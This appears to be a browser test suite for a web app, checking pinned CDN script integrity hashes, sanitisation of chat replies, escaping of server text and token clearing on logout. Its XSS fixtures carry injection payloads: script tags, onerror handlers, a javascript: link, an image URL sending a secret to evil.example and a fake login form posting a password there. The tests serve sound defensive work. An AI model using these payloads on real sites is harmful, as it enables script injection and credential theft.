const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { test, expect, login, openAudio, INDEX_URL } = require('./support/backend');

const html = fs.readFileSync(path.resolve(__dirname, '..', 'index.html'), 'utf8');
const NM = path.resolve(__dirname, '..', 'node_modules');
const LIB_FILES = () => [...html.matchAll(/\{ src: '([^']+)', integrity: '([^']+)' \}/g)].map((m) => m[1]);
const sri = (file) => 'sha384-' + crypto.createHash('sha384').update(fs.readFileSync(file)).digest('base64');
/** jsDelivr npm URL -> file in node_modules, checking that the installed version is the pinned one. */
function npmFile(url) {
  const m = url.match(/^https:\/\/cdn\.jsdelivr\.net\/npm\/((?:@[^/]+\/)?[^/@]+)@(\d+\.\d+\.\d+)\/(.+)$/);
  expect(m, url + ' is an exact-version jsDelivr npm URL').toBeTruthy();
  expect(JSON.parse(fs.readFileSync(path.join(NM, m[1], 'package.json'))).version, url).toBe(m[2]);
  return path.join(NM, m[1], m[3]);
}

test('every CDN script is pinned to an exact version with a matching integrity hash', async () => {
  const tags = [...html.matchAll(/<script\s+src="([^"]+)"([^>]*)>/g)];
  expect(tags.length).toBe(4);
  for (const [, src, attrs] of tags) {
    expect(attrs).toContain('crossorigin="anonymous"');
    expect(attrs).toContain('integrity="' + sri(npmFile(src)) + '"');
  }
  // Scripts loaded later (pdf.js and its worker).
  const lib = [...html.matchAll(/\{ src: '([^']+)', integrity: '([^']+)' \}/g)];
  expect(lib.length).toBe(2);
  for (const [, src, integrity] of lib) expect(integrity, src).toBe(sri(npmFile(src)));
  expect(html).not.toMatch(/cdnjs\.cloudflare\.com|unpkg\.com/);
});

test('the libraries load under their integrity checks', async ({ page, backend }) => {
  await page.goto(INDEX_URL);
  expect(await page.evaluate(() => [typeof JSZip, typeof marked, typeof DOMPurify, typeof PDFLib])).toEqual(['function', 'object', 'function', 'object']);
  // pdf.js 4 is an ES module: imported, with its module worker, from blob URLs of files fetched with integrity.
  expect(await page.evaluate(async () => { const pdf = await getPdfjs(); return [typeof pdf.getDocument, pdf.version, pdf.GlobalWorkerOptions.workerSrc.slice(0, 5)]; }))
    .toEqual(['function', '4.10.38', 'blob:']);
  expect(LIB_FILES()).toEqual(expect.arrayContaining([expect.stringContaining('pdfjs-dist@4.10.38/legacy/build/pdf.min.mjs'), expect.stringContaining('pdfjs-dist@4.10.38/legacy/build/pdf.worker.min.mjs')]));
  // A wrong hash is refused, for classic scripts and for modules.
  const BAD = 'sha384-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
  const err = await page.evaluate((bad) => loadScript({ src: LIB.pdfjs.src, integrity: bad }).then(() => 'loaded', (e) => e.message), BAD);
  expect(err).toContain('Could not load');
  const err2 = await page.evaluate((bad) => verifiedBlobUrl({ src: LIB.pdfjs.src, integrity: bad }).then(() => 'loaded', (e) => e.message), BAD);
  expect(err2).toContain('Could not load the PDF reader');
});

const EVIL = [
  'Hello **world**.',
  '<img src="https://evil.example/p?d=secret" onerror="window.__pwned=1">',
  '<script>window.__pwned=2</script>',
  '<form action="https://evil.example"><input name="password" placeholder="Password"><button>Log in</button></form>',
  '<p style="position:fixed;inset:0">cover</p>',
  '<svg><script>window.__pwned=3</script></svg>',
  '[bad](javascript:window.__pwned=4) and [good](https://example.org/paper)',
].join('\n\n');

test('chat replies are sanitized', async ({ page, backend }) => {
  backend.on('chat_start', (b) => ({ jobId: 'j1', convId: b.convId }));
  backend.on('chat_run', () => ({ state: 'done', reply: EVIL, cost: 0.001, model: 'claude-test' }));
  await login(page);
  await page.click('#tabChat');
  await page.fill('#prompt', 'Check this');
  await page.click('#sendBtn');
  const md = page.locator('.msg.assistant .md');
  await expect(md).toContainText('Hello world.');
  expect(await md.locator('img, script, form, input, button, svg, [style]').count()).toBe(0);
  const links = await md.locator('a').evaluateAll((as) => as.map((a) => [a.getAttribute('href'), a.target, a.rel]));
  expect(links).toEqual([[null, '', ''], ['https://example.org/paper', '_blank', 'noopener noreferrer']]);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
});

test('server text is shown as text, never as HTML', async ({ page, backend }) => {
  backend.library[0].title = '<img src=x onerror="window.__pwned=1">Mill';
  backend.library[0].chapters[0].title = '<b>bold</b>';
  backend.on('audio_text', () => ({ texts: ['<img src=x onerror="window.__pwned=2"> One.', 'Two <script>window.__pwned=3</script>.'] }));
  await login(page);
  await openAudio(page);
  await expect(page.locator('#library .libitem .t').first()).toHaveText('<img src=x onerror="window.__pwned=1">Mill');
  await page.locator('#library .libitem').first().getByRole('button', { name: 'Listen' }).click();
  // (The player splits sentences after "window.", hence the spaces.)
  await expect(page.locator('#pText')).toContainText('<img src=x onerror="window. __pwned=2"> One.');
  await expect(page.locator('#pText')).toContainText('Two <script>window. __pwned=3</script>.');
  await expect(page.locator('#pChapter option').first()).toHaveText('<b>bold</b>');
  expect(await page.locator('#library img, #playerCard img, #pText script').count()).toBe(0);
  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
});

test('logout forgets the token and everything shown for the account', async ({ page, backend }) => {
  backend.on('chat_start', (b) => ({ jobId: 'j1', convId: b.convId }));
  backend.on('chat_run', () => ({ state: 'done', reply: 'Private reply about the manuscript.', cost: 0.001 }));
  await login(page, 'alice');
  await page.click('#tabChat');
  await page.fill('#prompt', 'My unpublished result');
  await page.click('#sendBtn');
  await expect(page.locator('.msg.assistant')).toContainText('Private reply');
  await openAudio(page);
  await page.locator('#library .libitem').first().getByRole('button', { name: 'Listen' }).click();
  await expect(page.locator('#pText span.s').first()).toBeVisible();

  await page.click('#logoutBtn');
  expect(await page.evaluate(() => [sessionStorage.getItem('mp_token'), sessionStorage.getItem('mp_chat'), token])).toEqual([null, null, null]);
  // The position was saved before the token was dropped.
  expect(backend.callsOf('audio_progress').at(-1).token).toBe('tok-test');

  await login(page, 'bob');
  await expect(page.locator('#messages')).not.toContainText('Private reply');
  await expect(page.locator('#messages')).not.toContainText('unpublished');
  await expect(page.locator('#audioView')).toBeVisible();      // the first tab after login
  await expect(page.locator('#playerCard')).toBeHidden();
  expect(backend.calls.filter((c) => c.action !== 'login' && c.action !== 'audio_progress' && c.token !== 'tok-test')).toEqual([]);
});
